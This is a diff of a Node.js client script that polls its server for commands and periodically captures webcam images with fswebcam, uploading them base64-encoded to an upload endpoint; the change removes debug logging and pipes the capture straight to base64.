@@ -53,7 +53,6 @@ function cmdPoll() {
 		bot_mac:bot.mac,
 		last_cmd:bot.last_cmd
 	}, ret=>{
-		console.log(ret);
 		cmdPollLock=0;
 		ret.cmds.forEach(cmd=>{
 			if (cmd.id<bot.last_cmd) {
@@ -193,43 +192,33 @@ let lastUploadedGrab=0;
 function grabPhoto() {
 	clearTimeout(grabPhotoTimeout);
 	grabPhotoTimeout=setTimeout(grabPhoto, 11000);
-console.log(1);
 	if (photoLock && photoLock>(+(new Date))-10000) {
 		return;
 	}
-console.log(2);
 	photoLock=+(new Date);
-	exec("fswebcam --no-banner -r 800x600 grab.jpg", (err, stdout, stderr)=>{
-console.log(3);
-		fs.readFile('grab.jpg', (err, data)=>{
-console.log(4);
-			if (err) {
-				photoLock=0;
-				return;
-			}
-console.log(5);
-			var base64=data.toString('base64');
-			var hash=crypto
-				.createHash('md5')
-				.update(base64)
-				.digest('hex');
-			if (hash===lastUploadedGrab) {
-console.log('image has not changed');
-				photoLock=0;
-				clearTimeout(grabPhotoTimeout);
-				grabPhotoTimeout=setTimeout(grabPhoto, 1000);
-				return;
-			}
-			lastUploadedGrab=hash;
-			delete data;
-			ajax('/upload-image.php', {
-				mac:bot.mac,
-				base64:base64
-			}, ret=>{
-console.log(6);
-				photoLock=0;
-				grabPhoto();
-			});
+	
+	exec("fswebcam -d /dev/video0 -q --no-banner --save '-' | base64", function(err, stdout, stderr) {
+		if (err) {
+			photoLock=0;
+			return;
+		}
+		var hash=crypto
+			.createHash('md5')
+			.update(stdout)
+			.digest('hex');
+		if (hash===lastUploadedGrab) {
+			photoLock=0;
+			clearTimeout(grabPhotoTimeout);
+			grabPhotoTimeout=setTimeout(grabPhoto, 1000);
+			return;
+		}
+		lastUploadedGrab=hash;
+		ajax('/upload-image.php', {
+			mac:bot.mac,
+			data:stdout
+		}, ret=>{
+			photoLock=0;
+			grabPhoto();
 		});
 	});
 }
